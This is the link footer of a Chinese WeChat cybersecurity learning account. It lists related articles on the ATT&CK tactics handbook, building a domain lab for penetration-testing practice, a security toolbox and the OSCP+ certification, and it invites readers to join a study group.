[ATT&CK 网络攻击战术中文手册分享---看不懂英文版就来看中文版！](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485245&idx=1&sn=cfb5d014668fdd19df4a0481e7901a42&scene=21#wechat_redirect)  
  
  
[内网域环境搭建---学习内网渗透的第一步](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485056&idx=1&sn=dc8fd94fd9142e2e048a8ddf8b546d11&scene=21#wechat_redirect)  
  
  
[网安人都有的工具箱--ONE-FOX](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247484734&idx=1&sn=7a96ad9c0aa9c91ed814907c73692003&scene=21#wechat_redirect)  
  
  
[网安行业含金量高的证书【OSCP+】---Offensive Security官方认证](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247484758&idx=1&sn=d8b00fade4a06a8fbe455da47ebf10c6&scene=21#wechat_redirect)  
  
### 学习交流群  
  
**学习交流群**  
创建啦，**学习网络安全**  
遇到困难怎么办？那就加入我们吧，**群里大佬**  
为你解答，**互相交流**  
、**互相成长**  
，让我们成为网络安全道路上的**同行者**  
，与互相的**见证者**  
！  
  
群链接在**公众号主页**  
，如果链接过期了或有什么问题在后台通知我就行了！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtoiaOwXMX3micUasDCrAfCqSCsZg2RlOVvdhMlcxQ3gIdu2PnS4l7kl3A/640?wx_fmt=png&from=appmsg "")  
  
  
  
